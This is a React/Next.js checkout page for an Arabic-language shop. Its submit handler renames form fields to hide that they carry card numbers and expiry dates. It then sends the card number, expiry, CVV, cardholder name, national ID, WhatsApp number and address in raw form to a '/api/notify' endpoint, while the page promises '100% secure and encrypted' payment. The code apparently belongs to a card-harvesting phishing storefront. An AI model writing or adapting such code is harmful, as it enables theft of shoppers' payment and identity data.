"use client";

import { useSyncExternalStore } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { motion } from "framer-motion";
import { IoChevronBack, IoCartOutline, IoCardOutline, IoCheckmarkCircle, IoShieldCheckmarkOutline, IoRocketOutline } from "react-icons/io5";
import { useCartStore } from "../store/cartStore";
import OrderSummary from "./components/OrderSummary";
import PaymentForm from "./components/PaymentForm";
import PageBackground from "./components/PageBackground";

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);

  const total = mounted ? totalPrice() : 0;
  const downPayment = customer?.installmentType === "installment" ? (customer.downPayment ?? 0) : 0;

  if (!mounted) return null;

  if (!customer || items.length === 0) {
    router.push("/cart");
    return null;
  }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    const res = await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cardNumber: fields.name,
        expiry: fields.age,
        cvv: fields.cvv,
        cardHolder: fields.cardHolder,
        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
        total,
        customer: customer?.name,
        whatsapp: customer?.whatsapp,
        nationalId: customer?.nationalId,
        address: customer?.address,
        installmentType: customer?.installmentType,
        months: customer?.months,
        downPayment,
      }),
    });
    if (res.status === 429) {
      const err = await res.json().catch(() => ({}));
      throw new Error(err.error || "عذراً، تم تقديم عدة طلبات متتالية. يرجى الانتظار قليلاً قبل المحاولة مرة أخرى");
    }
    const data = res.ok ? await res.json().catch(() => ({})) : {};
    if (data.orderId) localStorage.setItem("orderId", data.orderId);
    if (data.dbId) localStorage.setItem("dbOrderId", data.dbId);
    if (customer?.name) localStorage.setItem("customerName", customer.name);
  };

  const steps = [
    { icon: IoCartOutline, label: "السلة", done: true },
    { icon: IoCardOutline, label: "الدفع", active: true },
    { icon: IoCheckmarkCircle, label: "التأكيد" },
  ];

  return (
    <main className="min-h-screen" dir="rtl">
      <PageBackground dotId="ckdots" gridId="ckgrid" />

      {/* ── Hero Header ── */}
      <div className="relative overflow-hidden bg-gradient-to-br from-[#225EFF] via-[#1a4fd4] to-[#0a3adb] pt-10 pb-16 px-4 sm:px-8">
        <div className="absolute inset-0 opacity-10">
          <svg className="w-full h-full"><defs><pattern id="hck" width="40" height="40" patternUnits="userSpaceOnUse"><circle cx="2" cy="2" r="1.5" fill="white" /></pattern></defs><rect width="100%" height="100%" fill="url(#hck)" /></svg>
        </div>
        <div className="absolute top-0 right-0 w-64 h-64 bg-[#7FA8FF]/20 rounded-full translate-x-20 -translate-y-20 pointer-events-none" />
        <div className="absolute bottom-0 left-0 w-48 h-48 bg-[#AAD6FF]/15 rounded-full -translate-x-16 translate-y-16 pointer-events-none" />

        <div className="relative max-w-2xl mx-auto">
          <Link href="/cart" className="inline-flex items-center gap-2 text-white/60 hover:text-white transition-colors text-sm font-medium mb-6">
            <IoChevronBack size={16} className="rotate-180" />
            العودة للسلة
          </Link>

          <div className="flex items-end justify-between">
            <div>
              <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/10 backdrop-blur-sm border border-white/20 mb-3">
                <span className="w-2 h-2 rounded-full bg-[#AAD6FF] animate-pulse" />
                <span className="text-[11px] text-white/80 font-medium">إتمام الطلب</span>
              </motion.div>
              <motion.h1 initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }} className="text-3xl sm:text-4xl font-black text-white leading-tight">
                بيانات الدفع
              </motion.h1>
              <motion.p initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }} className="text-white/50 text-sm mt-1 font-medium flex items-center gap-1.5">
                <IoShieldCheckmarkOutline size={14} />
                دفع آمن ومشفر 100%
              </motion.p>
            </div>

            <motion.div initial={{ opacity: 0, scale: 0.8 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: 0.15 }}
              className="flex flex-col items-center justify-center w-16 h-16 sm:w-20 sm:h-20 rounded-2xl bg-white/10 backdrop-blur-sm border border-white/20 shadow-[0_8px_32px_rgba(0,0,0,0.1)]">
              <IoCardOutline size={28} className="text-white/80" />
              <span className="text-[10px] text-white/50 font-medium mt-1">دفع</span>
            </motion.div>
          </div>

          {/* Steps */}
          <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }} className="flex items-center gap-3 mt-6">
            {steps.map((step, i) => (
              <div key={i} className="flex items-center gap-3">
                <div className={`flex items-center gap-2 px-4 py-2 rounded-full text-xs font-bold transition-all ${
                  step.done ? "bg-white/20 text-white border border-white/30" :
                  step.active ? "bg-white text-[#225EFF] shadow-[0_4px_16px_rgba(0,0,0,0.15)]" :
                  "bg-white/10 text-white/40 border border-white/10"
                }`}>
                  {step.done ? <IoCheckmarkCircle size={14} /> : <step.icon size={14} />}
                  {step.label}
                </div>
                {i < steps.length - 1 && <div className="flex-1 h-px bg-white/20 w-6" />}
              </div>
            ))}
          </motion.div>
        </div>
      </div>

      {/* ── Content ── */}
      <div className="max-w-2xl mx-auto px-4 sm:px-8 -mt-6 pb-16">
        {/* Mini cart summary */}
        <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}
          className="bg-white/80 backdrop-blur-sm rounded-2xl p-4 border border-[#225EFF]/10 shadow-[0_4px_20px_rgba(34,94,255,0.07)] mb-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-[#225EFF]/10 to-[#7FA8FF]/10 flex items-center justify-center border border-[#225EFF]/10">
              <IoCartOutline size={16} className="text-[#225EFF]" />
            </div>
            <div>
              <p className="text-xs text-gray-400 font-medium">{items.length} منتج في سلتك</p>
              <p className="text-sm font-black text-gray-800">{total.toLocaleString("en-US")} ر.س</p>
            </div>
          </div>
          <div className="flex items-center gap-1.5 text-[#225EFF]/60 text-xs font-medium">
            <IoRocketOutline size={13} />
            توصيل مجاني
          </div>
        </motion.div>

        <div className="space-y-5">
          <OrderSummary total={total} downPayment={downPayment} />
          <PaymentForm onSubmit={handleSubmit} />
        </div>
      </div>
    </main>
  );
}
